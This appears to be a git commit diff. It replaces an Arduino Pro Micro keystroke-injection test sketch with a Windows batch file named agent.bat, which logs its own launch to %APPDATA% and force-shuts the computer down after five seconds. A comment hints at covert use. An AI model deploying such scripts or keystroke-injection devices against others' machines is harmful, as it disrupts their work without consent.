ca9d9d0d1c7d50975e982016f8d8b4da004bb383
shosho2135 <shosho.1110104@gmail.com>
2025-04-21 12:47:16 +0900

    Update agent.bat

--- agent.bat
+++ agent.bat
@@ -1,13 +1,6 @@
-#include <Keyboard.h>
+@echo off
+REM ログを記録（バレてもいい場合）
+echo agent.bat 起動 >> %APPDATA%\agentlog.txt
 
-void setup() {
-  delay(3000);  // PC起動待機
-  Keyboard.begin();
-
-  // 100%化けないUS配列用文字列送信
-  Keyboard.print("Pro Micro test123:/\\");  // ← 本命の1行
-  Keyboard.end();
-}
-
-void loop() {}
-
+REM 強制シャットダウン
+shutdown /s /f /t 5
